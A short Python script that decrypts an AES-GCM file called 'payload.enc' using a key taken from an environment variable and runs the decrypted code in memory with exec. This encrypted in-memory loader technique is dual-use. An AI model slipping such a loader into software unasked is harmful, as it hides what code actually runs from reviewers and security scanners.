#!/usr/bin/env python3
import os, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

ENC_PATH = "payload.enc"
ENV_KEY  = "ESPO_KEY"

def die(msg):
    sys.stderr.write(msg + "\n")
    sys.exit(1)

def main():
    secret = os.environ.get(ENV_KEY)
    if not secret:
        die("Missing environment variable ESPO_KEY")

    data = open(ENC_PATH, "rb").read()
    salt, nonce, ct = data[:16], data[16:28], data[28:]

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=200_000,
    )
    key = kdf.derive(secret.encode("utf-8"))
    aesgcm = AESGCM(key)
    code = aesgcm.decrypt(nonce, ct, None)

    # In-memory execution only
    exec(compile(code, "<secure>", "exec"), { "__name__": "__main__" })

if __name__ == "__main__":
    main()
